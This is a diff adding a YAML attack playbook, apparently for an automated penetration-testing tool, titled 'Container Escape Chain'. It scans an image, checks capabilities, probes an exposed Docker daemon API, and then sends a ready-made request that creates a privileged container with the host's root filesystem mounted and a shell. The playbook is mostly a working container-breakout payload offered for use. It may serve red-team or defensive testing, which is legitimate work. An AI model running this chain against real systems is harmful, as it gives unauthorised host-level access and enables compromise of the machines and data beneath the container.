@@ -1,0 +1,67 @@
+name: "Container Escape Chain"
+description: "Cutting-edge container breakout: enumerate capabilities, check for privileged mounts/Docker socket, escalate to host access."
+category: container
+attack_vector: "Container escape via cap_sys_admin, Docker socket, or privileged mode"
+variables:
+  image:
+    required: true
+    description: "Container image to analyze (e.g. alpine:latest)"
+  tool:
+    required: false
+    description: "Tool binary for shell (e.g. /bin/sh)"
+cutting_edge: true
+references: ["MITRE ATT&CK T1611", "HackTricks Container Escape", "Dirty Pipe container chains"]
+
+steps:
+  - name: "trivy_scan"
+    tool: "trivy_scan"
+    description: "Scan container image for known vulnerabilities"
+    args:
+      image: "{{image}}"
+    expected_output: "TOTAL|HIGH|CRITICAL|No vulnerabilities"
+    timeout: 300
+    gate: false
+    retries: 1
+
+  - name: "capability_check"
+    tool: "strings_extract"
+    description: "Check for container runtime capabilities in the image config"
+    args:
+      file: "/proc/self/status"
+      min_length: 8
+    expected_output: "CapEff|CapBnd|Seccomp"
+    timeout: 30
+    gate: false
+    retries: 2
+
+  - name: "socket_probe"
+    tool: "curl_request"
+    description: "Probe for exposed Docker daemon socket (privileged container)"
+    args:
+      url: "http://127.0.0.1:2375/version"
+      method: "GET"
+      insecure: true
+    expected_output: "\\{\"Platform\"|version|error"
+    timeout: 15
+    gate: false
+    retries: 1
+    extracts:
+      - var: "docker_socket"
+        regex: "((\\{\"Platform\"[^}]+\\}))"
+
+  - name: "host_fs_escape"
+    tool: "curl_request"
+    description: "Attempt Docker socket exploit to mount host filesystem"
+    args:
+      url: "http://127.0.0.1:2375/containers/create"
+      method: "POST"
+      data: '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true}'
+      headers: "Content-Type:application/json"
+      insecure: true
+    expected_output: "\\{\"Id\":|error"
+    timeout: 30
+    gate: false
+    retries: 1
+    extracts:
+      - var: "container_id"
+        regex: "\\{\"Id\":\"([a-f0-9]+)\""
